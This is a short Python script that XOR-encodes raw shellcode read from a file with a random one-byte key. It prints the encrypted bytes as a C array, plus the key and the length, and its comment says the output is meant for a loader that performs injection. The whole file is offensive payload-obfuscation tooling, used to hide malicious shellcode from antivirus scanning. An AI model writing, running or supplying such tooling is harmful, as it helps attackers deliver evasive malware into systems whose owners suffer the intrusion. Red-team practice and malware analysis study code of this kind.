import random                     
from random import randrange      
import argparse                  
import sys                        


def get_raw_sc(input_file):
    """
    Reads raw shellcode bytes from the specified input file.
    """
    file_shellcode = b''           
    try:
        with open(input_file, 'rb') as shellcode_file:  
            file_shellcode = shellcode_file.read()      
            file_shellcode = file_shellcode.strip()     
        return file_shellcode         
    except FileNotFoundError:         
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def format_shellcode(encrypted_shellcode):
    """
    Formats a hex string shellcode into C-style hex byte array representation.
    """
    chunked_shellcode = [encrypted_shellcode[i:i + 2] for i in range(0, len(encrypted_shellcode), 2)]
    final_shellcode = ""
    for chunk in chunked_shellcode:
        final_shellcode += "0x" + str(chunk).zfill(2) + ","   
    final_shellcode = final_shellcode.rstrip(',')             
    return final_shellcode


def XOR(shellcode_bytes, key):
    """
    Applies XOR encryption on each byte of the shellcode using the provided key byte.
    Returns the encoded bytes.
    """
    encoded = []
    for i in range(0, len(shellcode_bytes)):
        encoded.append(shellcode_bytes[i] ^ key)  
    return bytes(encoded)  


def main():
    """
    - Parses command line for a required input file argument.
    - Reads shellcode from the file.
    - Generates a random XOR key and encrypts the shellcode.
    - Prints the shellcode length, the encrypted shellcode, the XOR key, and the original shellcode.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str, required=True,
                        help="File containing raw shellcode.")  
    
    if len(sys.argv) == 1:            
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    args = parser.parse_args()
    input_file = args.input            

    xorkey = randrange(0, 255)        # Generate random XOR key (0-254)
    shellcode = get_raw_sc(input_file)  # Read raw shellcode bytes
    xor_shellcode = XOR(shellcode, xorkey).hex()  # Encrypt shellcode and convert to hex string

    # Output values for use in Loader for injection
    print("\n###SC_LENGTH###")
    print(len(shellcode))                # Prints length of the original shellcode
    
    print("\n###SHELLCODE###")
    print(format_shellcode(xor_shellcode))  # Prints formatted encrypted shellcode
    
    print("\n###XORKEY###")
    print(hex(xorkey))                   # Prints the XOR key used for encryption
    
    # Print original shellcode bytes in hex for reference
    original_shellcode = ""
    for byte in shellcode:
        original_shellcode += str(hex(byte).zfill(2)) + ", "
    original_shellcode = original_shellcode.rstrip(', ')
    print("\nOriginal shellcode:")
    print(original_shellcode)


if __name__ == '__main__':  
    main()
